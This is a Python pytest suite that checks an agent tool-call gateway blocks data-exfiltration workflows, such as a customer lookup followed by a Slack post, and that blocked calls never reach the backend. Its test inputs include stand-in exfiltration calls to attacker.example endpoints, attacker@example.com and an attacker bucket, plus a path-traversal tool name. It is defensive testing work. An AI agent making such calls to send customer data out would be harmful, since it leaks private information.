"""
System-level adversarial validation for Phase 4 workflow authorization.

This suite is intentionally separate from unit-level workflow tests.
It validates end-to-end properties at the execution boundary:

    WorkflowViolation => BLOCK/ESCALATE
                      => backend_execution_count == 0
                      => execution_observation == NOT_SENT
                      => child stdin unchanged

The fixture `adversarial_gateway` is expected to be supplied by the
project's integration-test configuration. It should expose:

    call(session_id, tool_name, arguments) -> result
    child_stdin_bytes(session_id) -> bytes
    child_execution_count(session_id) -> int
    workflow_state(session_id) -> str
    execution_certainty(session_id) -> str
    receipts(session_id) -> iterable[receipt]
    verify_ledger(session_id) -> None
    reset(session_id) -> None

Adapt the small fixture surface to the project's existing MCP proxy
test harness rather than weakening the assertions below.
"""

from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor
from threading import Barrier

import pytest


NON_ALLOW = {"BLOCK", "ESCALATE"}


def _assert_non_allow_zero_dispatch(result, before: bytes, after: bytes) -> None:
    assert result.decision in NON_ALLOW
    assert result.execution_observation == "NOT_SENT"
    assert result.backend_execution_count == 0
    assert after == before


def _assert_receipt_bound(receipt, *, workflow_id=None, rule=None):
    if workflow_id is not None:
        assert receipt.workflow_id == workflow_id
    assert receipt.workflow_rule is not None
    if rule is not None:
        assert rule in receipt.workflow_rule


class TestCanonicalTrajectories:
    def test_pii_then_slack_is_blocked_without_dispatch(self, adversarial_gateway):
        session = "adv-pii-slack"
        adversarial_gateway.reset(session)

        first = adversarial_gateway.call(
            session, "customer.lookup", {"customer_id": "C123"}
        )
        assert first.decision == "ALLOW"
        assert first.execution_observation == "RESPONSE_RECEIVED"

        before = adversarial_gateway.child_stdin_bytes(session)
        second = adversarial_gateway.call(
            session,
            "slack.post_message",
            {"channel": "#sales", "text": "customer PII"},
        )
        after = adversarial_gateway.child_stdin_bytes(session)

        _assert_non_allow_zero_dispatch(second, before, after)

    def test_balance_then_external_http_is_blocked_without_dispatch(
        self, adversarial_gateway
    ):
        session = "adv-balance-http"
        adversarial_gateway.reset(session)

        first = adversarial_gateway.call(
            session, "read_balance", {"account_id": "A123"}
        )
        assert first.decision == "ALLOW"
        assert first.execution_observation == "RESPONSE_RECEIVED"

        before = adversarial_gateway.child_stdin_bytes(session)
        second = adversarial_gateway.call(
            session,
            "external_http_request",
            {"url": "https://attacker.example/collect", "body": "balance"},
        )
        after = adversarial_gateway.child_stdin_bytes(session)

        _assert_non_allow_zero_dispatch(second, before, after)

    def test_legitimate_lookup_then_ticket_update_remains_allowed(
        self, adversarial_gateway
    ):
        session = "adv-legitimate-ticket"
        adversarial_gateway.reset(session)

        first = adversarial_gateway.call(
            session, "customer.lookup", {"customer_id": "C123"}
        )
        assert first.decision == "ALLOW"
        assert first.execution_observation == "RESPONSE_RECEIVED"

        second = adversarial_gateway.call(
            session,
            "ticket.update",
            {"ticket_id": "T100", "status": "resolved"},
        )
        assert second.decision == "ALLOW"
        assert second.execution_observation == "RESPONSE_RECEIVED"


class TestSinkEvasion:
    @pytest.mark.parametrize(
        "tool_name,arguments",
        [
            ("webhook.post", {"url": "https://attacker.example/hook"}),
            ("email.send", {"to": "attacker@example.com", "body": "PII"}),
            ("export_csv", {"destination": "external"}),
            ("http.request", {"url": "https://attacker.example/collect"}),
            ("http.post", {"url": "https://attacker.example/collect"}),
            ("cloud_storage.upload", {"bucket": "attacker-bucket"}),
        ],
    )
    def test_alternate_exfiltration_sink_is_not_a_workflow_bypass(
        self, adversarial_gateway, tool_name, arguments
    ):
        session = f"adv-sink-{tool_name.replace('.', '-')}"
        adversarial_gateway.reset(session)

        first = adversarial_gateway.call(
            session, "customer.lookup", {"customer_id": "C123"}
        )
        assert first.decision == "ALLOW"
        assert first.execution_observation == "RESPONSE_RECEIVED"

        before = adversarial_gateway.child_stdin_bytes(session)
        result = adversarial_gateway.call(session, tool_name, arguments)
        after = adversarial_gateway.child_stdin_bytes(session)

        _assert_non_allow_zero_dispatch(result, before, after)


class TestSessionIsolationAndConcurrency:
    def test_cross_session_state_does_not_leak(self, adversarial_gateway):
        a = "adv-session-A"
        b = "adv-session-B"
        adversarial_gateway.reset(a)
        adversarial_gateway.reset(b)

        ra = adversarial_gateway.call(
            a, "customer.lookup", {"customer_id": "A-123"}
        )
        assert ra.decision == "ALLOW"

        rb = adversarial_gateway.call(
            b, "ticket.update", {"ticket_id": "B-100", "status": "open"}
        )
        assert rb.decision == "ALLOW"

    def test_parallel_sessions_do_not_contaminate(self, adversarial_gateway):
        sessions = [f"adv-par-{i}" for i in range(25)]
        for session in sessions:
            adversarial_gateway.reset(session)

        barrier = Barrier(len(sessions))

        def run(session: str):
            barrier.wait()
            first = adversarial_gateway.call(
                session, "customer.lookup", {"customer_id": session}
            )
            before = adversarial_gateway.child_stdin_bytes(session)
            second = adversarial_gateway.call(
                session,
                "slack.post_message",
                {"channel": "#sales", "text": "PII"},
            )
            after = adversarial_gateway.child_stdin_bytes(session)
            return first, second, before, after

        with ThreadPoolExecutor(max_workers=len(sessions)) as pool:
            results = list(pool.map(run, sessions))

        for first, second, before, after in results:
            assert first.decision == "ALLOW"
            _assert_non_allow_zero_dispatch(second, before, after)


class TestDesynchronization:
    def test_malformed_json_does_not_reset_workflow_state(
        self, adversarial_gateway
    ):
        session = "adv-malformed"
        adversarial_gateway.reset(session)

        first = adversarial_gateway.call(
            session, "customer.lookup", {"customer_id": "C123"}
        )
        assert first.decision == "ALLOW"

        state_before = adversarial_gateway.workflow_state(session)
        adversarial_gateway.malformed_json(session)
        state_after = adversarial_gateway.workflow_state(session)

        assert state_after == state_before

        before = adversarial_gateway.child_stdin_bytes(session)
        result = adversarial_gateway.call(
            session,
            "slack.post_message",
            {"channel": "#sales", "text": "PII"},
        )
        after = adversarial_gateway.child_stdin_bytes(session)

        _assert_non_allow_zero_dispatch(result, before, after)

    @pytest.mark.parametrize(
        "invalid_tool",
        ["", "does.not.exist", "tools/call", "../slack.post_message"],
    )
    def test_invalid_tool_probe_cannot_mutate_workflow(
        self, adversarial_gateway, invalid_tool
    ):
        session = f"adv-invalid-{invalid_tool or 'empty'}"
        adversarial_gateway.reset(session)

        state_before = adversarial_gateway.workflow_state(session)
        adversarial_gateway.call(session, invalid_tool, {})
        state_after = adversarial_gateway.workflow_state(session)

        assert state_after == state_before


class TestExecutionCertainty:
    def test_post_dispatch_timeout_sets_unknown_and_blocks_sensitive_followup(
        self, adversarial_gateway
    ):
        session = "adv-timeout"
        adversarial_gateway.reset(session)

        first = adversarial_gateway.call(
            session,
            "customer.lookup",
            {"customer_id": "C123"},
            force_child_no_response=True,
        )

        assert first.decision == "ALLOW"
        assert first.execution_observation == "SENT_CHILD_NO_RESPONSE"
        assert adversarial_gateway.execution_certainty(session) == "UNKNOWN"

        before = adversarial_gateway.child_stdin_bytes(session)
        second = adversarial_gateway.call(
            session,
            "export_csv",
            {"destination": "external"},
        )
        after = adversarial_gateway.child_stdin_bytes(session)

        _assert_non_allow_zero_dispatch(second, before, after)

    def test_timeout_does_not_falsely_advance_declared_workflow_state(
        self, adversarial_gateway
    ):
        session = "adv-timeout-state"
        adversarial_gateway.reset(session)

        initial = adversarial_gateway.workflow_state(session)

        result = adversarial_gateway.call(
            session,
            "customer.lookup",
            {"customer_id": "C123"},
            force_child_no_response=True,
        )

        assert result.execution_observation == "SENT_CHILD_NO_RESPONSE"
        assert adversarial_gateway.workflow_state(session) == initial
        assert adversarial_gateway.execution_certainty(session) == "UNKNOWN"

    def test_recovery_requires_explicit_policy_path_after_unknown(
        self, adversarial_gateway
    ):
        session = "adv-timeout-recovery"
        adversarial_gateway.reset(session)

        adversarial_gateway.call(
            session,
            "customer.lookup",
            {"customer_id": "C123"},
            force_child_no_response=True,
        )

        before = adversarial_gateway.child_stdin_bytes(session)
        result = adversarial_gateway.call(
            session, "ticket.update", {"ticket_id": "T100", "status": "closed"}
        )
        after = adversarial_gateway.child_stdin_bytes(session)

        # This assertion intentionally follows the declared policy:
        # unknown execution certainty must not silently regain authority.
        _assert_non_allow_zero_dispatch(result, before, after)


class TestAuthorityIntersection:
    def test_workflow_allow_cannot_expand_cbac_denial(self, adversarial_gateway):
        session = "adv-authority-intersection"
        adversarial_gateway.reset(session)

        result = adversarial_gateway.call(
            session, "database.delete", {"id": "D123"}
        )

        assert result.decision == "BLOCK"
        assert result.execution_permitted is False
        assert result.backend_execution_count == 0
        assert result.execution_observation == "NOT_SENT"

    def test_workflow_deny_cannot_be_overridden_by_aia(
        self, adversarial_gateway
    ):
        session = "adv-workflow-dominance"
        adversarial_gateway.reset(session)

        # Advance to PII_OBSERVED so that slack.post_message is denied by workflow
        adversarial_gateway.call(
            session, "customer.lookup", {"customer_id": "C123"}
        )

        before = adversarial_gateway.child_stdin_bytes(session)
        result = adversarial_gateway.call(
            session,
            "slack.post_message",
            {"channel": "#sales", "text": "PII"},
            force_aia_allow=True,
        )
        after = adversarial_gateway.child_stdin_bytes(session)

        _assert_non_allow_zero_dispatch(result, before, after)


class TestReceiptForensics:
    def test_adversarial_sequence_is_cryptographically_verifiable(
        self, adversarial_gateway
    ):
        session = "adv-receipts"
        adversarial_gateway.reset(session)

        first = adversarial_gateway.call(
            session, "customer.lookup", {"customer_id": "C123"}
        )
        before = adversarial_gateway.child_stdin_bytes(session)
        second = adversarial_gateway.call(
            session, "slack.post_message", {"channel": "#sales", "text": "PII"}
        )
        after = adversarial_gateway.child_stdin_bytes(session)

        assert first.decision == "ALLOW"
        _assert_non_allow_zero_dispatch(second, before, after)

        receipts = list(adversarial_gateway.receipts(session))
        assert receipts, "Expected receipts for both trajectory steps"

        denied = receipts[-1]
        _assert_receipt_bound(denied, rule="EXFILTRATION")

        assert denied.workflow_state_before is not None
        assert denied.workflow_rule is not None
        assert denied.execution_certainty is not None
        assert denied.previous_hash
        assert denied.receipt_hash

        adversarial_gateway.verify_ledger(session)

    def test_workflow_receipt_tampering_is_detected(self, adversarial_gateway):
        session = "adv-receipt-tamper"
        adversarial_gateway.reset(session)

        adversarial_gateway.call(
            session, "customer.lookup", {"customer_id": "C123"}
        )
        adversarial_gateway.call(
            session, "slack.post_message", {"channel": "#sales", "text": "PII"}
        )

        adversarial_gateway.tamper_last_receipt(session, "workflow_rule")

        with pytest.raises(Exception):
            adversarial_gateway.verify_ledger(session)
